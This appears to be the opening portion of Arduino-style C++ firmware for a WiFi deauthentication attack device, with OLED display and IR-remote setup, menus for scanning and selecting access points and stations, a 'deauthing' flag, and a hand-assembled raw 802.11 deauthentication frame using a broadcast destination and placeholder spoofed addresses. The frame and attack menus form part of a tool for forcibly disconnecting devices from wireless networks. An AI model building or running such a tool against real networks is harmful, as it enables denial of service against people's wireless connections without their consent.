#define down 16754775
#define up 16736925
//#define c 16753245
#define c 16712445
#define i2c_Address 0x3c
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SH1106G dis = Adafruit_SH1106G(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
IRrecv irrecv(14);
decode_results results;



Menu* activem;
Menu* mainm;

Menu* scanm;
Menu* apScanm;
Menu* stScanm;

Menu* selectm;
Menu* selectAp;
Menu* selectSt;

Menu* attackm;
Menu* deauthm;

bool deauthing = false;

struct AccessPoint {
  String ssid;
  uint8_t *bssid;
};
std::vector<AccessPoint> apList;
std::vector<bool> selectedApList;

struct Station {
  String ssid;
  uint8_t *bssid;
  int rssid;
};
std::vector<Station> stList;
std::vector<bool> selectedStList;


bool firstApScan = false;


uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //Frame-Typ
      /*  2 - 3  */ 0x00, 0x00, //Zeitspanne
      /*  4 - 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Ziel-Adresse
      /* 10 - 15 */ 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, //Quell-Adresse
      /* 16 - 21 */ 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, //Indentifizierungs-Adresse
      /* 22 - 23 */ 0x00, 0x01, //Sequenz-nummer
      /* 24 - 25 */ 0x01, 0x00 //Reason-code
};